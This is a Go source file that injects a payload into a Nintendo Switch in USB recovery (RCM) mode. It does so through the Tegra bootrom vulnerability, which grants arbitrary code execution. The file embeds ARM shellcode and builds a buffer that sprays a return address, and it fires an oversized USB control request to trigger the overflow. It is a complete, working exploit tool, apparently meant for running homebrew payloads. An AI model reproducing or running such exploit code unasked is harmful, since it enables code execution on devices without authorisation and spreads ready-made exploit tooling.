package inject

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os"
	"time"

	"github.com/google/gousb"
)

var intermezzo = []byte{
	0x44, 0x00, 0x9f, 0xe5, 0x01, 0x11, 0xa0, 0xe3, 0x40, 0x20, 0x9f, 0xe5, 0x00, 0x20, 0x42, 0xe0, 0x08, 0x00, 0x00,
	0xeb, 0x01, 0x01, 0xa0, 0xe3, 0x10, 0xff, 0x2f, 0xe1, 0x00, 0x00, 0xa0, 0xe1, 0x2c, 0x00, 0x9f, 0xe5, 0x2c, 0x10,
	0x9f, 0xe5, 0x02, 0x28, 0xa0, 0xe3, 0x01, 0x00, 0x00, 0xeb, 0x20, 0x00, 0x9f, 0xe5, 0x10, 0xff, 0x2f, 0xe1, 0x04,
	0x30, 0x90, 0xe4, 0x04, 0x30, 0x81, 0xe4, 0x04, 0x20, 0x52, 0xe2, 0xfb, 0xff, 0xff, 0x1a, 0x1e, 0xff, 0x2f, 0xe1,
	0x20, 0xf0, 0x01, 0x40, 0x5c, 0xf0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40,
}

const (
	rcmPayloadAddress  = 0x40010000
	intermezzoLocation = 0x4001f000
)

func createRCMPayload(payload []byte) []byte {
	rcmLength := uint32(0x30298)

	intermezzoAddressRepeatCount := (intermezzoLocation - rcmPayloadAddress) / 4

	rcmPayloadSize := ((0x2a8 + 0x4*intermezzoAddressRepeatCount + 0x1000 + len(payload) + 0x1000 - 1) / 0x1000) * 0x1000

	rcmPayload := make([]byte, rcmPayloadSize)

	// Set rcmLength at the beginning of the payload
	binary.LittleEndian.PutUint32(rcmPayload[0:], rcmLength)

	// Write INTERMEZZO_LOCATION repeatedly
	for i := range intermezzoAddressRepeatCount {
		binary.LittleEndian.PutUint32(rcmPayload[0x2a8+i*4:], intermezzoLocation)
	}

	// Copy INTERMEZZO and payload into the buffer
	copy(rcmPayload[0x2a8+0x4*intermezzoAddressRepeatCount:], intermezzo)
	copy(rcmPayload[0x2a8+0x4*intermezzoAddressRepeatCount+0x1000:], payload)

	return rcmPayload
}

func writeToDevice(dev *gousb.OutEndpoint, data []byte) (int, error) {
	length := len(data)
	writeCount := 0
	packetSize := 0x1000

	for length > 0 {
		dataToTransmit := min(length, packetSize)
		length -= dataToTransmit

		chunk := data[:dataToTransmit]
		data = data[dataToTransmit:]

		_, err := dev.Write(chunk)
		if err != nil {
			return writeCount, err
		}
		writeCount++
	}

	return writeCount, nil
}

func findRCMDevices(ctx *gousb.Context) ([]*gousb.Device, error) {
	// Nintendo Switch RCM mode VID:PID = 0x0955:0x7321
	return ctx.OpenDevices(func(desc *gousb.DeviceDesc) bool {
		return desc.Vendor == 0x0955 && desc.Product == 0x7321
	})
}

func injectPayload(dev *gousb.Device, payload []byte) error {
	// Get device info
	manufacturer, _ := dev.Manufacturer()
	product, _ := dev.Product()
	fmt.Printf("Connected to %s %s\n", manufacturer, product)

	// Claim interface
	intf, _, err := dev.DefaultInterface()
	if err != nil {
		return fmt.Errorf("failed to claim interface: %v", err)
	}
	defer intf.Close()

	// Get device ID
	inEndpoint, err := intf.InEndpoint(1)
	if err != nil {
		return fmt.Errorf("failed to get in endpoint: %v", err)
	}
	idBuffer := make([]byte, 16)
	_, err = inEndpoint.Read(idBuffer)
	if err == nil {
		fmt.Printf("Device ID: %s\n", hex.EncodeToString(idBuffer))
	}

	// Preapre the out endpoint
	outEndpoint, err := intf.OutEndpoint(1)
	if err != nil {
		return fmt.Errorf("failed to get out endpoint: %v", err)
	}

	// Create and send RCM payload
	rcmPayload := createRCMPayload(payload)
	fmt.Println("Sending payload...")
	writeCount, err := writeToDevice(outEndpoint, rcmPayload)
	if err != nil {
		return fmt.Errorf("failed to send payload: %v", err)
	}
	fmt.Println("Payload sent!")

	if writeCount%2 != 1 {
		fmt.Println("Switching to higher buffer...")
		emptyBuffer := make([]byte, 0x1000)
		_, err = outEndpoint.Write(emptyBuffer)
		if err != nil {
			return fmt.Errorf("failed to switch buffer: %v", err)
		}
	}

	// Trigger vulnerability
	fmt.Println("Triggering vulnerability...")

	// set a timeout here, since the following control out request will never complete
	// because the Switch doesn't respond to this packet after the payload is injected
	dev.ControlTimeout = time.Millisecond

	vulnerabilityLength := 0x7000
	_, _ = dev.Control(
		gousb.ControlIn|gousb.ControlInterface,
		0x00,
		0x00,
		0x00,
		make([]byte, vulnerabilityLength),
	)

	return nil
}

// TODO: don't leave devices open? open in inject?
func Inject(payloadPath string) error {
	// Read payload from file
	payload, err := os.ReadFile(payloadPath)
	if err != nil {
		return err
	}

	// Initialize USB context
	ctx := gousb.NewContext()
	defer ctx.Close()

	// Look for RCM devices
	devices, err := findRCMDevices(ctx)
	if err != nil {
		return err
	}
	defer func() {
		for _, d := range devices {
			d.Close()
		}
	}()

	if len(devices) == 0 {
		return fmt.Errorf("no Nintendo Switch RCM devices found")
	}

	fmt.Printf("Found %d RCM device(s)\n", len(devices))

	// Send payload to the first device found
	device := devices[0]
	err = injectPayload(device, payload)
	if err != nil {
		return err
	}

	fmt.Println("Injection completed successfully!")
	return nil
}
